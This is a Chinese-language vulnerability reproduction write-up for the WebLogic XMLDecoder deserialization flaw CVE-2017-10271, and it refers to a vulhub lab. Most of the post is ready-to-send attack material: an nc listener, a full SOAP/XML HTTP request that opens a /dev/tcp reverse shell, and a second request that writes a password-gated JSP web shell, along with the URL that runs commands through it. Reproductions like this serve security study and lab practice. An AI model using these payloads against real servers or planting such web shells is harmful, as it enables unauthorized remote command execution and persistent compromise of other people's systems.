---
title: Weblogic < 1.3.6 反序列化(CVE-2017-10271)
date: 2020-07-02 20:49:57
categories: 漏洞复现
tags: Weblogic
---

#### 背景

Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。

<!--more-->

#### 复现过程

##### 反弹shell

1. nc 监听

   ```bash
   nc -lvp 444
   ```

2. POC

   使用bp发送如下payload

   ```http
   POST /wls-wsat/CoordinatorPortType HTTP/1.1
   Host: your-ip:7001
   Accept-Encoding: gzip, deflate
   Accept: */*
   Accept-Language: en
   User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
   Connection: close
   Content-Type: text/xml
   Content-Length: 633
   
   <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
   <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
   <java version="1.4.0" class="java.beans.XMLDecoder">
   <void class="java.lang.ProcessBuilder">
   <array class="java.lang.String" length="3">
   <void index="0">
   <string>/bin/bash</string>
   </void>
   <void index="1">
   <string>-c</string>
   </void>
   <void index="2">
   <string>bash -i &gt;&amp; /dev/tcp/*.*.*.*/4444 0&gt;&amp;1</string>
   </void>
   </array>
   <void method="start"/></void>
   </java>
   </work:WorkContext>
   </soapenv:Header>
   <soapenv:Body/>
   </soapenv:Envelope>
   ```

   注意将反弹shell的地址修改为nc监听地址

   ![](http://cdn.laohuan.art/2020-07-02_14-08-54.png)

##### 写shell

1. 使用bp发送如下paylaod

   ```http
   POST /wls-wsat/CoordinatorPortType HTTP/1.1
   Host: IP:7001
   Accept-Encoding: gzip, deflate
   Accept: */*
   Accept-Language: en
   User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
   Connection: close
   Content-Type: text/xml
   Content-Length: 905
   
   <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
       <soapenv:Header>
       <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
       <java><java version="1.4.0" class="java.beans.XMLDecoder">
       <object class="java.io.PrintWriter"> 
       <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
       <void method="println"><string>
       <![CDATA[
   <%if("test".equals(request.getParameter("pwd"))){java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
   int a = -1;
   byte[] b = new byte[2048];
   out.print("<pre>");
   while((a=in.read(b))!=-1){
   out.println(new String(b));
   }
   out.print("</pre>");}%>
       ]]>
       </string>
       </void>
       <void method="close"/>
       </object></java></java>
       </work:WorkContext>
       </soapenv:Header>
       <soapenv:Body/>
   </soapenv:Envelope>
   ```

   ![](http://cdn.laohuan.art/2020-07-02_15-27-25.png)

2. 连接shell

   ```url
   http://IP:7001/bea_wls_internal/test.jsp?pwd=test&i=ifconfig
   ```

   ![](http://cdn.laohuan.art/2020-07-02_15-27-44.png)

#### 参考链接

<https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271/>